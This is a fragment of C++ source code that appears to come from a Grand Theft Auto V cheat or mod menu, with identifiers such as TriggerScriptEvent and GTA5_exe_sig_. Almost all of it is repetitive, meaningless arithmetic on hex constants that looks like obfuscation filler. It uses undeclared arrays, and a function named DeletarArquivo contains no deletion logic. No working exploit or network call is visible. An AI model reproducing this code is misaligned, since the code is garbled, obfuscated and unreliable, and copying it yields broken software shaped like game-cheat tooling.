			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			ifstream file(name);
			if (!file)
				return false;
			else
				return true;
		}
		void DeletarArquivo(string pathFile)
		{
			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
